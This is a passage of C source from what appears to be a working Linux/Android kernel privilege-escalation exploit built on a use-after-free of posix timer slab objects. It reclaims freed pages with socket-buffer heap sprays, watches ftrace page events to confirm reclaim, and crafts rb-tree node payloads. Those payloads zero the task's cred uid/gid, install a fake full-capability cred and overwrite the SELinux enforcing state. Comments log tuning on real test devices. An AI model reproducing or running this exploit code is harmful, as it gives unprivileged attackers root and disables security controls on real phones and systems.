		"[half] free_pfn=%#" PRIx64 " cpu=%d len=%zu\n",
		free_pfn, free_cpu, len);
	for (int round = 0; round < 6; round++) {
		for (int i = 0, sock = 0; i < 80; i++) {
			ssize_t n = write(g_stream[sock][0], slice, len);
			if (n == (ssize_t)len)
				wrote++;
			else if (++sock >= g_nstream)
				break;
		}
		if (find_page_alloc_page(free_pfn, free_cpu)) {
			dprintf(STDOUT_FILENO,
				"[half] hit pfn=%#" PRIx64 " writes=%d\n",
				free_pfn, wrote);
			return 0;
		}
		nanosleep(&pause, NULL);
	}
	dprintf(STDOUT_FILENO, "[half] miss pfn=%#" PRIx64 " writes=%d cover=%lu\n",
		free_pfn, wrote, g_alloc_cover);
	return -1;
}

static double now_s(void);

/* P4-style page chase (Shark v2.4 "page chase"): the burst lost the race for
 * the victim page.  Keep the zombie unreaped, wait for the pfn to come back
 * to the buddy allocator, then fire bounded spray rounds and accept only a
 * strict self-owned allocation (order-1 slab at the base, or an order-0 page
 * at the exact pfn).  On give-up the victim stays OPEN for the watcher and
 * the caller falls through to victim_eval_miss. */
static int victim_chase(struct vict *v, const unsigned char *pat,
			uint64_t base, uint64_t node_pfn, int free_cpu)
{
	int total_ms = env_int("PC98260_CHASE_MS", 8000, 1000, 30000);
	int max_rounds = env_int("PC98260_CHASE_ROUNDS", 4, 1, 8);
	int round_wait_ms = env_int("PC98260_CHASE_WAIT_MS", 1500, 100, 60000);
	int per_round = env_int("PC98260_CHASE_POST", 512, 80, 4096);
	struct timespec pause = { .tv_nsec = 50000000 };
	struct page_free_info pf;
	double deadline = now_s() + total_ms / 1000.0;
	int ncpu = cpu_count();
	int rounds = 0;

	if (!g_nstream || !v || v->state != V_OPEN)
		return 0;
	/* New events are needed for the chase; only re-enable the writer,
	 * never truncate the ring: victim_eval_miss still wants the reclaim
	 * window's records if the chase gives up. */
	write_file(TRACE "/tracing_on", "1\n");
	while (rounds < max_rounds && now_s() < deadline) {
		int free_seen = 0, hit = 0, wrote = 0;
		double w0 = now_s();

		memset(&pf, 0, sizeof(pf));
		while (now_s() - w0 < round_wait_ms / 1000.0) {
			if (find_page_free(base, node_pfn, &pf)) {
				free_seen = 1;
				free_cpu = pf.cpu;
				break;
			}
			nanosleep(&pause, NULL);
		}
		rounds++;
		dprintf(STDOUT_FILENO,
			"[chase] round=%d/%d free_seen=%d cpu=%d\n",
			rounds, max_rounds, free_seen, free_cpu);
		/* Fire a bounded round; a lost free record must not end the
		 * chase (Shark fires blind rounds for the same reason). */
		for (int i = 0; i < per_round; i++) {
			ssize_t n;
			pin_cpu(free_cpu >= 0 ? free_cpu : (i % ncpu));
			n = write(g_stream[i % g_nstream][0], pat, 8192);
			if (n == 8192) {
				wrote++;
				continue;
			}
			/* Full socket: skip a batch and let the reader drain. */
			i += 7;
		}
		/* Strict proofs only: order-1 slab at the base, or order-0 page
		 * at the exact pfn.  Never accept an order>=2 cover (09:35 panic). */
		if (find_page_alloc(node_pfn, free_cpu)) {
			dprintf(STDOUT_FILENO,
				"[chase] hit round=%d pfn=%#" PRIx64 " writes=%d\n",
				rounds, node_pfn, wrote);
			hit = 1;
		} else if (find_page_alloc_page(node_pfn, free_cpu)) {
			dprintf(STDOUT_FILENO,
				"[chase] half hit round=%d pfn=%#" PRIx64 " writes=%d\n",
				rounds, node_pfn, wrote);
			hit = 1;
		}
		if (hit) {
			write_file(TRACE "/tracing_on", "0\n");
			return 1;
		}
		/* Raw reads consume the ring; the text scanner walks newest-first,
		 * so an earlier round's records cannot be mistaken for this round's
		 * hit.  Nothing to drain. */
	}
	dprintf(STDOUT_FILENO,
		"[chase] gave up rounds=%d pfn=%#" PRIx64 "\n", rounds, node_pfn);
	write_file(TRACE "/tracing_on", "0\n");
	return 0;
}

static int reclaim_stream(uint64_t victim, uint64_t target, struct vict *v)
{
	uint64_t base = object_pfn(victim + KITIMER_NODE) & ~UINT64_C(1);
	uint64_t node_pfn = object_pfn(victim + KITIMER_NODE);
	unsigned node_off = (unsigned)((victim + KITIMER_NODE) & 0x1fff);
	unsigned char *pat;
	struct page_free_info pf;
	int free_cpu = -1;
	int big = 16 << 20, hit = 0, writes = 0, ncpu;
	struct timespec start, now;
	fast_pool_prepare();
	atomic_store_explicit(&g_fast_active, 0, memory_order_release);
	if (node_off + 24 > 8192)
		return -1;
	pat = mmap(NULL, 8192, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (pat == MAP_FAILED)
		return -1;
	memset(pat, 0, 8192);
	if (g_plant_cred && g_tiles_on) {
		/* real-cred: in-place ZERO-writes into the child's REAL cred.
		 * PLANT_ZERO shape {pc=0, rb_right=0, rb_left=target} drives the
		 * rb_erase Case-2 single-child path: [target] = 0.  pc=0 keeps
		 * parent == NULL, so augment->propagate never runs and rb_next()
		 * returns NULL (drain stops).  Never point pc at a real parent:
		 * that walks rb_left into cred data and panics in rb_next. */
		uint64_t page = PAGE_OFFSET + ((base - GEOM_MEMSTART_PFN) << 12);
		for (int b = 0; b < 3; b++) {
			unsigned off = g_tile_off[b];
			uint64_t *node = (uint64_t *)(pat + off);
			int kind = g_tile_kind[b];
			if (off + 24 > 8192) {
				dprintf(STDOUT_FILENO, "[cred] tile %d off=%#x\n", b, off);
				munmap(pat, 8192);
				return -1;
			}
			if (kind == TILE_CRED) {
				if (g_no_real_cred) {
					/* fake-cred: install a page-local full-cap cred into
					 * task->cred, including its SELinux blob and stable
					 * references.  A uid-only write loses CAP_CHOWN and
					 * the vendor-LSM context needed by rootd. */
					uint64_t node_kva = page + off;
					uint64_t cred_kva = node_kva + CRED_OFF;
					uint64_t *cred;
					unsigned blob = 0x1f00;
					if (off + CRED_OFF + GEO_CRED_SIZE > blob) {
						dprintf(STDOUT_FILENO,
							"[cred] fake tile collides off=%#x\n", off);
						munmap(pat, 8192);
						return -1;
					}
					node[0] = g_task + g_cred_slot - 8;
					node[1] = cred_kva;
					node[2] = 0;
					cred = (uint64_t *)(pat + off + CRED_OFF);
					*(uint64_t *)cred = UINT64_C(0x100000);
					for (int cap = 48; cap <= 80; cap += 8)
						*(uint64_t *)((char *)cred + cap) = FULLCAP;
					*(uint64_t *)((char *)cred + 128) = page + blob;
					*(uint64_t *)((char *)cred + 136) = slide_addr(LINK_ROOT_USER);
					*(uint64_t *)((char *)cred + 144) = slide_addr(LINK_USER_NS);
					*(uint64_t *)((char *)cred + 152) = slide_addr(LINK_UCOUNTS);
					*(uint64_t *)((char *)cred + 160) = slide_addr(LINK_GROUPS);
					g_cred_kva = cred_kva;
					dprintf(STDOUT_FILENO,
						"[tile] FAKE_CRED off=%#x cred=%#" PRIx64
						" task+cred=%#" PRIx64 "\n",
						off, cred_kva, g_task + g_cred_slot);
				} else {
					/* real-cred: PLANT_ZERO uid/gid = 0 */
					node[0] = 0; node[1] = 0;
					node[2] = g_cred_kva + GEO_CRED_UID;
					dprintf(STDOUT_FILENO,
						"[tile] CRED off=%#x zero=%#" PRIx64 "\n",
						off, node[2]);
				}
			} else if (kind == TILE_SELINUX) {
				node[0] = 0; node[1] = 0;
				node[2] = slide_addr(SELINUX_LINK) - 7;
				dprintf(STDOUT_FILENO,
					"[tile] SELINUX off=%#x zero=%#" PRIx64 "\n",
					off, node[2]);
			} else if (kind == TILE_CRED2) {
				/* PLANT_PTR: pc = A (stale node's own kva, an RB_EMPTY
				 * self-parent) so [cred+cap_effective] = A.  rb_next()
				 * returns NULL on RB_EMPTY and the augment propagate
				 * breaks immediately (rb_parent(A)==A), so this is as
				 * safe as PLANT_ZERO while writing a nonzero value.
				 * When A's bit16 is set, CapEff gains CAP_SYS_MODULE. */
				uint64_t A = page + off;
				node[0] = A; node[1] = 0;
				node[2] = g_cred_kva + GEO_CRED_CAP_EFF;
				dprintf(STDOUT_FILENO,
					"[tile] CRED2 off=%#x A=%#" PRIx64 " (bit16=%d) cap=%#" PRIx64 "\n",
					off, A, (int)((A >> 16) & 1), node[2]);
			}
		}
	} else if (g_plant_cred) {
		/* single-node fallback: same PLANT_ZERO on the real cred uid/gid. */
		uint64_t *node = (uint64_t *)(pat + node_off);
		if (node_off + 24 > 8192) {
			munmap(pat, 8192);
			return -1;
		}
		node[0] = 0;
		node[1] = 0;
		node[2] = g_cred_kva + GEO_CRED_UID;
		dprintf(STDOUT_FILENO,
			"[cred] zero-write real cred+8 target=%#" PRIx64 " off=%#x\n",
			g_cred_kva + GEO_CRED_UID, node_off);
	} else {
		unsigned align = node_off % 24u;
		for (unsigned off = align; off + 24 <= 8192; off += 24) {
			uint64_t *node = (uint64_t *)(pat + off);
			node[0] = 0;
			node[1] = 0;
			node[2] = target;
		}
		dprintf(STDOUT_FILENO, "[stream] tile align=%u off=%#x\n", align, node_off);
	}
	if (open_stream_socks()) {
		munmap(pat, 8192);
		return -1;
	}
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[stream] pairs=%d node_base=%#" PRIx64 " off=%#x\n",
		g_nstream, base, node_off);
	/* PORT (2026-11-12): the per-cpu text dump expands ~3.7x over the ring
	 * (8195 KB -> 30.2 MB measured on g142), while the scanner can read at
	 * most TRACE_TAIL_CAP (12 MiB).  2048 KB keeps the whole dump (~7.5 MiB)
	 * inside that window, so the read covers the complete newest history;
	 * 8192 relied on the broken SEEK_END tail path and went blind once the
	 * dump outgrew the cap.  Retention is still ~10-15 s at this event
	 * rate, enough for the 8 s spray window.  PC98260_STREAM_BUF_KB can
	 * override it for A/B experiments. */
	{
		char bs[32];
		const char *env = getenv("PC98260_STREAM_BUF_KB");
		snprintf(bs, sizeof(bs), "%d\n", env ? atoi(env) : 2048);
		if (write_file(TRACE "/buffer_size_kb", bs)) {
			close_stream();
			return -1;
		}
	}
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	if (trace_off_on() || kick_rss()) {
		close_stream();
		return -1;
	}
	/* Reclaim is fully armed: only now may the victim exec and the killer fire. */
	raw_trace_open();
	dprintf(STDOUT_FILENO, "[stream] raw_trace=%d fast_pool=%d\n",
		g_raw_active, g_fast_started == 1);
	atomic_store_explicit(&ipc->exec_ready, 1, memory_order_release);
	dprintf(STDOUT_FILENO, "[stream] exec_gate=open\n");
	int freed = 0;
	{
		/* The page normally returns within a few hundred ms of the kill;
		   waiting 8 s on a miss just burns the retry budget. */
		struct timespec pause = { .tv_nsec = 50000000 };
		struct timespec w0, w1;
		int iters = 0;
		long cap_ms, wait_ms;
		struct timespec now;
		{
			const char *env = getenv("PC98260_WAIT_CAP_S");
			int secs = env ? atoi(env) : 60;
			cap_ms = (long)(secs > 0 ? secs : 60) * 1000;
		}
		memset(&pf, 0, sizeof(pf));
		/* 6.12/Honor: the empty slab can stay on a CPU partial list, so a
		 * plain free_slab wait is not enough. Churn timers first. */
		if (timer_churn(base, node_pfn, &pf))
			freed = 1;
		wait_ms = cap_ms;
		if (!freed) {
			/* timer_churn() has already actively cycled every CPU through
			 * its full round budget.  A 25 s passive wait afterwards only
			 * rescans the same empty trace window, so keep a bounded tail
			 * for in-flight frees; the configured cap remains the upper
			 * bound.  The tail was 1 s, but the 2026-11-14 00:06 g142 run
			 * freed the victim's slab only after churn had finished
			 * (later attempts hit at churn rounds 2-5 under load 16).
			 * 1 s expired first and turned a late free into an unproven
			 * victim that must be held until reboot.  5 s leaves room for
			 * the RCU callback + SLUB discard under load without paying
			 * the full cap on a real miss. */
			long tail_ms = env_int("PC98260_POST_CHURN_WAIT_MS",
					       5000, 0, 60000);
			if (tail_ms < wait_ms)
				wait_ms = tail_ms;
		}
		/* 进度可见：万一再卡，日志能直接指出卡在"等 page_freed"里。 */
		dprintf(STDOUT_FILENO,
			"[stream] waiting page_freed pfn=%#" PRIx64 " (cap %ld ms, configured %ld ms)\n",
			base, wait_ms, cap_ms);
		clock_gettime(CLOCK_MONOTONIC, &w0);
		for (int i = 0; i < 1200 && !freed; i++) {
			nanosleep(&pause, NULL);
			freed = find_page_free(base, node_pfn, &pf);
			iters = i + 1;
			clock_gettime(CLOCK_MONOTONIC, &now);
			/* 墙钟上界：将来内核改动让命中变难时，这里保证只是"多花
			 * 一次重试"，而不是退化成无界等待。 */
			if (!freed &&
			    (long)((now.tv_sec - w0.tv_sec) * 1000 +
				   (now.tv_nsec - w0.tv_nsec) / 1000000) >= wait_ms) {
				dprintf(STDOUT_FILENO,
					"[stream] wait cap %ld ms hit at iter %d, "
					"treating as miss\n", wait_ms, iters);
				break;
			}
		}
		clock_gettime(CLOCK_MONOTONIC, &w1);
		dprintf(STDOUT_FILENO,
			"[stream] page_freed=%d pfn=%#" PRIx64 " order=%d cpu=%d (%ld ms, %d iter)\n",
			freed, pf.pfn, pf.order, pf.cpu,
			(long)((w1.tv_sec - w0.tv_sec) * 1000 +
			       (w1.tv_nsec - w0.tv_nsec) / 1000000),
			iters);
		if (!freed) {
			raw_diag_free(base);
			if (find_page_free_text(node_pfn, &pf)) {
				freed = 1;
				dprintf(STDOUT_FILENO,
					"[stream] text fallback page_freed pfn=%#" PRIx64
					" order=%d cpu=%d\n", pf.pfn, pf.order, pf.cpu);
			}
		}
		if (freed && pf.order == 0) {
			size_t half = (pf.pfn == base) ? 0 : 4096;
			if (pf.pfn != node_pfn) {
				dprintf(STDOUT_FILENO,
					"[half] wrong half pfn=%#" PRIx64 " node_pfn=%#" PRIx64 "\n",
					pf.pfn, node_pfn);
				victim_eval_miss(v);
				quiet_reclaim_trace();
				munmap(pat, 8192);
				close_stream();
				return -1;
			}
			if (reclaim_stream_half(pat + half, 4096, pf.pfn, pf.cpu) == 0) {
				write_file(TRACE "/tracing_on", "0\n");
				quiet_reclaim_trace();
				munmap(pat, 8192);
				return 0;
			}
			victim_eval_miss(v);
			quiet_reclaim_trace();
			munmap(pat, 8192);
			close_stream();
			return -1;
		}
		if (freed)
			free_cpu = pf.cpu;
	}
	/* OnekeyJB's successful trace is explicit: RECLAIM_FREED=1 precedes the
	 * bounded writes.  Never spray on a free-detection miss: that only allocates
	 * unrelated pages and leaves another armed victim without proving reclaim. */
	if (!freed) {
		dprintf(STDOUT_FILENO, "[stream] skip writes: no proven page free\n");
		victim_eval_miss(v);
		quiet_reclaim_trace();
		munmap(pat, 8192);
		close_stream();
		return -1;
	}
	clock_gettime(CLOCK_MONOTONIC, &start);
	/* Shark/OnekeyJB's measured successful tile used a 4096-write budget.
	 * Keep it bounded and check after every 80-write batch; a verified hit exits
	 * immediately, so successful attempts do not pay the full budget. */
	int write_budget = env_int("PC98260_STREAM_WRITE_BUDGET", 4096, 80, 16384);
	int spray_rounds = (write_budget + 79) / 80;
	dprintf(STDOUT_FILENO, "[stream] write_budget=%d batch=80\n", write_budget);
	int fast = g_raw_active && g_fast_started == 1 && g_nstream >= FAST_SPRAY_THREADS &&
		env_int("PC98260_FAST_SPRAY", 1, 0, 1);
	dprintf(STDOUT_FILENO, "[stream] fast_spray=%d reason=%s\n",
		fast, fast ? "raw_parallel" : "raw_unavailable_or_disabled");
	if (fast) {
		long scanned = 0;
		g_fast_pat = pat;
		g_fast_cpu = free_cpu;
		atomic_store_explicit(&g_fast_writes, 0, memory_order_relaxed);
		atomic_store_explicit(&g_fast_active, 1, memory_order_release);
		while (!hit) {
			long w = atomic_load_explicit(&g_fast_writes, memory_order_relaxed);
			if (w >= write_budget)
				break;
			if (w - scanned >= 80) {
				hit = find_page_alloc(node_pfn, free_cpu);
				scanned = w;
			} else {
				struct timespec pollpause = { .tv_nsec = 2000000 };
				nanosleep(&pollpause, NULL);
			}
			clock_gettime(CLOCK_MONOTONIC, &now);
			if (now.tv_sec - start.tv_sec > 8)
				break;
		}
		atomic_store_explicit(&g_fast_active, 0, memory_order_release);
		while (atomic_load_explicit(&g_fast_inflight, memory_order_acquire))
			usleep(100);
		writes = (int)atomic_load_explicit(&g_fast_writes, memory_order_relaxed);
	}
	for (int round = 0; !fast && round < spray_rounds && !hit; round++) {
		for (int i = 0, sock = 0; i < 80 && !hit; i++) {
			ssize_t n;
			pin_cpu(free_cpu >= 0 ? free_cpu : (i % ncpu));
			n = write(g_stream[sock][0], pat, 8192);
			if (n == 8192)
				writes++;
			else if (++sock >= g_nstream)
				break;
		}
		/* The stale node lives in one specific 4K half.  Covering only
		 * the buddy half is a false positive: the tile never reached the
		 * node and the reap silently skips the write (observed uid=2000
		 * after a "hit").  Require our allocation on the node half. */
		hit = find_page_alloc(node_pfn, free_cpu);
		clock_gettime(CLOCK_MONOTONIC, &now);
		if (now.tv_sec - start.tv_sec > 8)
			break;
	}
	{
		unsigned long cover8k = g_alloc_cover;
		if (!hit && free_cpu >= 0) {
			size_t half = (node_pfn == base) ? 0 : 4096;
			dprintf(STDOUT_FILENO,
				"[stream] 8K miss; retry 4K half=%zu pfn=%#" PRIx64 "\n",
				half / 4096, node_pfn);
			if (reclaim_stream_half(pat + half, 4096, node_pfn,
						free_cpu) == 0)
				hit = 1;
		}
		write_file(TRACE "/tracing_on", "0\n");
		if (hit)
			dprintf(STDOUT_FILENO, "[stream] hit pfn=%#" PRIx64 "\n", base);
		dprintf(STDOUT_FILENO,
			"[stream] writes=%d hit=%d cover8k=%lu cover=%lu\n",
			writes, hit, cover8k, g_alloc_cover);
	}
	if (!hit)
		hit = victim_chase(v, pat, base, node_pfn, free_cpu);
	if (!hit)
		victim_eval_miss(v);
	quiet_reclaim_trace();
	munmap(pat, 8192);
	if (!hit)
		close_stream();
	return hit ? 0 : -1;
}

static int g_dgram[2] = { -1, -1 };

static int reclaim_dgram(uint64_t victim, uint64_t target)
{
	uint64_t node_pfn = object_pfn(victim + KITIMER_NODE);
	uint64_t base = node_pfn & ~UINT64_C(1);
	unsigned node_off = (unsigned)((victim + KITIMER_NODE) & 0xfff);
	unsigned char *buf;
	int ncpu, sent = 0, hit = 0, big = 8 << 20;
	int victim_frees = 0, buddy_frees = 0, order2 = 0;
	uint64_t buddy = base ^ UINT64_C(2);
	if (node_off + 24 > 4096)
		return -1;
	buf = mmap(NULL, 16384, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (buf == MAP_FAILED)
		return -1;
	memset(buf, 0, 16000);
	for (int page = 0; page < 4; page++) {
		unsigned off = (unsigned)page * 4096u + node_off;
		uint64_t *node;
		if (off + 24 > 16000)
			continue;
		node = (uint64_t *)(buf + off);
		node[0] = 0;
		node[1] = 0;
		node[2] = target;
	}
	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, g_dgram)) {
		munmap(buf, 16384);
		return -1;
	}
	setsockopt(g_dgram[0], SOL_SOCKET, SO_SNDBUF, &big, sizeof(big));
	setsockopt(g_dgram[1], SOL_SOCKET, SO_RCVBUF, &big, sizeof(big));
	fcntl(g_dgram[0], F_SETFL, O_NONBLOCK);
	build_watch();
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[dgram] cpus=%d node_pfn=%#" PRIx64 " off=%#x\n",
		ncpu, node_pfn, node_off);
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	if (trace_off_on() || kick_rss())
		return -1;
	for (int i = 0; i < 512; i++) {
		struct timespec pause = { .tv_nsec = 40000000 };
		ssize_t n;
		if ((i % 8) == 0)
			pin_cpu((i / 8) % ncpu);
		n = send(g_dgram[0], buf, 16000, MSG_DONTWAIT);
		if (n == 16000)
			sent++;
		else if (i > 16 && sent > 8)
			break;
		if ((i % 8) == 7)
			nanosleep(&pause, NULL);
	}
	write_file(TRACE "/tracing_on", "0\n");
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			uint64_t pfn;
			pfn = parse_pfn(line);
			if (pfn == UINT64_MAX)
				continue;
			if (strstr(line, "mm_page_free:") && strstr(line, "order=1")) {
				if (pfn == base)
					victim_frees++;
				if (pfn == buddy)
					buddy_frees++;
			}
			if (!strstr(line, "mm_page_alloc:") || !strstr(line, "order=2"))
				continue;
			order2++;
			if (base == pfn || base == pfn + 2) {
				hit = 1;
				dprintf(STDOUT_FILENO, "[dgram] hit %s", line);
			}
		}
		fclose(file);
	}
	dprintf(STDOUT_FILENO,
		"[dgram] sent=%d hit=%d order2=%d victim_frees=%d buddy_frees=%d buddy=%#" PRIx64 "\n",
		sent, hit, order2, victim_frees, buddy_frees, buddy);
	quiet_reclaim_trace();
	munmap(buf, 16384);
	return hit ? 0 : -1;
}

static double now_s(void)
{
	struct timespec t;
	clock_gettime(CLOCK_MONOTONIC, &t);
	return (double)t.tv_sec + (double)t.tv_nsec / 1e9;
}

/* ------------------------------------------------------------------------
 * Raw trace event-id calibration (2026-11-12).
 *
 * /sys/kernel/tracing/events/kmem/<event>/id is unreadable to the shell domain on
 * Honor 6.12 (SELinux denies even stat()), which used to disable the raw
 * path and force every check through the text dump.  The ids can be learned
 * without privilege: enable exactly one page event, make a page alloc/free of
 * our own, take the newest matching line from the text dump to learn the
 * pfn/order, then find the same pfn/order in trace_pipe_raw.  The raw
 * record's type field is that event's id.  Fail closed: any mismatch leaves
 * the caller on the text path.
 * ------------------------------------------------------------------------ */
static int newest_self_page_line(const char *ev, double since,
				 uint64_t *pfn_out, int *order_out)
{
	int ncpu = cpu_count();
	int best_cpu = -1;
	double best = -1.0;
	uint64_t best_pfn = 0;
	int best_order = 0;
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128];
		struct trace_tail *t;
		size_t budget = TRACE_SCAN_BUDGET;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		t = trace_tail_open(path);
		if (!t)
			continue;
		while (budget && trace_tail_next(t)) {
			size_t used = strlen(t->line) + 1;
			double ts;
			uint64_t pfn;
			int order;
			if (used >= budget) {
				budget = 0;
				break;
			}
			budget -= used;
			if (!strstr(t->line, ev) || !trace_task_is_self(t->line))
				continue;
			ts = trace_line_ts(t->line, ev);
			if (ts < since)
				continue;
			pfn = parse_pfn(t->line);
			order = line_order(t->line);
			if (pfn == UINT64_MAX || order < 0)
				continue;
			if (ts > best) {
				best = ts;
				best_pfn = pfn;
				best_order = order;
				best_cpu = cpu;
			}
			/* The walk is newest-first; this is the newest match on
			 * this cpu, so no older line can win here. */
			break;
		}
		trace_tail_close(t);
	}
	if (best_cpu < 0)
		return 0;
	*pfn_out = best_pfn;
	*order_out = best_order;
	return 1;
}

/* Dominant event type among raw records that look like ours.  Calibration
 * enables only one page event per phase, so after generating a burst of page
 * allocs (or frees) the matching type dominates; unrelated events from other
 * tasks are filtered by common_pid.  pfn/order sanity keeps stray records
 * out.  Observation only: failures leave raw mode off. */
static int raw_self_type(int *count_out)
{
	static int counts[4096];
	int ncpu = cpu_count();
	int self = (int)getpid();
	int best = 0, bestn = 0;
	memset(counts, 0, sizeof(counts));
	for (int cpu = 0; cpu < ncpu; cpu++) {
		long n = raw_read_cpu(cpu);
		for (long i = 16; i + 12 <= n; i += 4) {
			uint64_t pfn;
			int type, pid, ord;
			type = (int)(raw_u32((unsigned char *)g_tt_buf + i - 8) & 0xffff);
			pid = (int)raw_u32((unsigned char *)g_tt_buf + i - 4);
			pfn = raw_u64((unsigned char *)g_tt_buf + i);
			ord = (int)raw_u32((unsigned char *)g_tt_buf + i + 8);
			if (pid != self)
				continue;
			if (type <= 0 || type >= 4096)
				continue;
			if (ord < 0 || ord > 10)
				continue;
			if (pfn == 0 || pfn > UINT64_C(0x1000000))
				continue;
			counts[type]++;
		}
	}
	for (int t = 1; t < 4096; t++)
		if (counts[t] > bestn) {
			bestn = counts[t];
			best = t;
		}
	if (getenv("PC98260_RAW_DUMP"))
		for (int t = 1; t < 4096; t++)
			if (counts[t])
				dprintf(STDOUT_FILENO,
					"[raw-dump] type=%d count=%d\n", t, counts[t]);
	*count_out = bestn;
	return best;
}

#define CAL_SIZE (1U << 20)

static int raw_calibrate_ids(int *alloc_id, int *free_id)
{
	void *p;
	int count = 0, aid = -1, fid = -1;

	/* One page event per phase: with both enabled the dominant-type test
	 * could not tell an alloc id from a free id.  Fault 1 MiB with THP off
	 * so each touch is an order-0 mm_page_alloc of our own; the alloc burst
	 * then outweighs the buddy-split page_free records that the fault path
	 * also emits. */
	trigger_cmd("disable_event:kmem:mm_page_free\n");
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	drain_raw_pipes();
	p = mmap(NULL, CAL_SIZE, PROT_READ | PROT_WRITE,
		 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (p == MAP_FAILED) {
		dprintf(STDOUT_FILENO, "[raw] calibrate mmap errno=%d\n", errno);
		goto restore;
	}
	madvise(p, CAL_SIZE, MADV_NOHUGEPAGE);
	for (unsigned i = 0; i < CAL_SIZE; i += 4096)
		((volatile unsigned char *)p)[i] = 1;
	usleep(50000);
	aid = raw_self_type(&count);
	if (count < 32)
		aid = -1;
	trigger_cmd("disable_event:kmem:mm_page_alloc\n");
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	drain_raw_pipes();
	munmap(p, CAL_SIZE);
	usleep(50000);
	fid = raw_self_type(&count);
	if (count < 16)
		fid = -1;
restore:
	/* The reclaim window wants both events; calibration must not leave the
	 * trace filtered down to one of them. */
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	if (aid > 0 && fid > 0 && aid != fid) {
		*alloc_id = aid;
		*free_id = fid;
		dprintf(STDOUT_FILENO,
			"[raw] calibrated alloc_id=%d free_id=%d\n", aid, fid);
		return 0;
	}
	dprintf(STDOUT_FILENO,
		"[raw] calibrate failed alloc=%d free=%d (text fallback)\n", aid, fid);
	return -1;
}

/* --trace-selftest: run the trace reader/calibration as an unprivileged shell
 * user (same uid/domain as the real run) without touching the UAF. */
static int trace_selftest(void)
{
	int rc = 0;
	dprintf(STDOUT_FILENO, "[selftest] begin uid=%u euid=%u\n",
		getuid(), geteuid());
	if (write_file(TRACE "/buffer_size_kb", "2048\n")) {
		dprintf(STDOUT_FILENO, "[selftest] buffer_size failed errno=%d\n",
			errno);
		return 2;
	}
	if (trigger_cmd("enable_event:kmem:mm_page_alloc\n") ||
	    trigger_cmd("enable_event:kmem:mm_page_free\n") ||
	    kick_rss() || trace_off_on()) {
		dprintf(STDOUT_FILENO, "[selftest] trace arm failed errno=%d\n",
			errno);
		return 2;
	}
	{
		double t0 = now_s();
		uint64_t pfn = 0;
		int order = 0;
		void *p = mmap(NULL, 65536, PROT_READ | PROT_WRITE,
			       MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
		if (p == MAP_FAILED) {
			dprintf(STDOUT_FILENO, "[selftest] mmap errno=%d\n", errno);
			rc = 3;
		} else {
			for (int i = 0; i < 65536; i += 4096)
				((volatile unsigned char *)p)[i] = 1;
			usleep(50000);
			if (newest_self_page_line("mm_page_alloc:", t0, &pfn,
						  &order))
				dprintf(STDOUT_FILENO,
					"[selftest] tail alloc ok pfn=%#" PRIx64
					" order=%d\n", pfn, order);
			else {
				dprintf(STDOUT_FILENO,
					"[selftest] tail alloc MISS\n");
				rc = 3;
			}
			munmap(p, 65536);
		}
	}
	if (raw_trace_open() == 0)
		dprintf(STDOUT_FILENO,
			"[selftest] raw ok alloc_id=%d free_id=%d active=%d\n",
			g_raw_alloc_id, g_raw_free_id, g_raw_active);
	else {
		dprintf(STDOUT_FILENO, "[selftest] raw unavailable\n");
		rc = 3;
	}
	raw_trace_close();
	quiet_reclaim_trace();
	disarm();
	dprintf(STDOUT_FILENO, "[selftest] rc=%d\n", rc);
	return rc;
}

/* Choose three timers that (a) sit in the same 8 KB slab and (b) cover three
   different clock bases, so the three drain loops each hit one of them. The
   leak gives us every k_itimer KVA in creation order, and the creation loop
   assigns clock base i%3, so the base of index i is simply i%3. */
static int pick_triple(int total)
{
	/* The very first slab of the cache stays frozen as the cpu_slab and never
	   returns to the buddy (measured: page_freed=0 forever), so only middle
	   slabs are candidates. Start with the slab that held index 1024 -- the
	   one the single-timer build proved frees -- and then sweep the middle
	   half. */
	uint64_t pref = total > 1024 ? g_all[1024] & ~UINT64_C(0x1fff) : 0;
	int lo = total / 3;
	int hi = total - total / 3;
	uint64_t owned = 0;
	int owned_n = -1;
	/* The g893 08:21 log proves this cache is an 8 KiB (order-1) slab: a
	 * single 4 KiB page holds 16 object starts at stride 0x108 and the 16th
	 * object straddles the page boundary.  Score the whole 8 KiB slab
	 * (31 objects) and arm only on a slab made entirely of our timers; a
	 * slab that still carries another process's live k_itimer never
	 * empties, so its page never reaches the buddy. */
	for (int i = lo; i < hi; i++) {
		uint64_t slab = g_all[i] & ~UINT64_C(0x1fff);
		int c = 0;
		if (i > lo && slab == (g_all[i - 1] & ~UINT64_C(0x1fff)))
			continue;
		for (int j = lo; j < hi; j++)
			if ((g_all[j] & ~UINT64_C(0x1fff)) == slab)
				c++;
		if (c > owned_n) {
			owned_n = c;
			owned = slab;
		}
	}
	if (pref) {
		int pc = 0;
		for (int j = 0; j < total; j++)
			if ((g_all[j] & ~UINT64_C(0x1fff)) == pref)
				pc++;
		if (pc >= owned_n) {
			owned = pref;
			owned_n = pc;
		}
	}
	if (owned_n > 0)
		dprintf(STDOUT_FILENO,
			"[triple] owned slab=%#" PRIx64 " count=%d/%d\n",
			owned, owned_n, GEO_POSIX_TIMER_OBJ_PER_SLAB);
	for (int pass = 0; pass < 2; pass++) {
	for (int i = lo; i < hi; i++) {
		uint64_t slab = g_all[i] & ~UINT64_C(0x1fff);
		int idx[3] = { -1, -1, -1 };
		if (pass == 0 && slab != owned)
			continue;
